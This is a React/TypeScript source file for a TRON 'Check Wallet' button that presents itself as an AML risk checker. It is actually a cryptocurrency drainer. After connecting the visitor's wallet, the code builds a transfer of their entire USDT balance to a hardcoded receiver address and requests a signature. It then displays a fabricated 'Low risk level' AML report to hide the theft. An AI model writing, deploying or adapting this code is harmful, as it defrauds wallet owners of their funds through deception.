// src/components/tronAuthButton/TronAuthButton.tsx
import React, { useState, useEffect } from 'react';
import { tronWeb, adapter } from './tronWallet'; // без расширения .ts
import { Buffer } from 'buffer';

window.Buffer = Buffer;

const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

export const TronAuthButton: React.FC = () => {
  const [status,  setStatus]  = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    // разовая прединициализация
    ;(adapter as any).init?.().catch(() => {});
  }, []);

  const connectWallet = async () => {
    if (loading) return;
    setLoading(true);
    setStatus(null);

    try {
      if (adapter.connected) await adapter.disconnect();
      await adapter.connect();

      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) {
        throw new Error('Invalid wallet address');
      }
      tronWeb.setAddress(userAddress);

      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx    = trxRaw / 1e6;
      if (trx < 2) {
        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
        return;
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt         = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        setStatus('succes');
        return;
      }

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );
      const signed = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signed);

      setStatus(result?.result ? 'succes' : '⚠️ Connection or transaction error');
    } catch (err: any) {
      console.error(err);
      const msg = err.message || String(err);
      if (!/User rejected|Modal is closed|Timeout/.test(msg)) {
        setStatus('⚠️ Connection or transaction error');
      }
    } finally {
      setLoading(false);
      await adapter.disconnect();
    }
  };

  return (
    <>
      <div className={`AuthButton${loading ? ' disabled' : ''}`} onClick={connectWallet}>
        {loading ? 'Connecting...' : 'Check Wallet'}
      </div>

      {status && (
        <div className="modal__overflow">
          <div className="modal">
            {status !== 'succes' ? (
              <p>{status}</p>
            ) : (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div><span className="circ green" /> 0–30</div>
                      <div><span className="circ orange" /> 31–69</div>
                      <div><span className="circ red" /> 70–100</div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for a wallet:</p>
                  <h5>{USDT_CONTRACT}</h5>
                </div>
              </>
            )}
            <button onClick={() => setStatus(null)}>Close</button>
          </div>
        </div>
      )}
    </>
  );
};
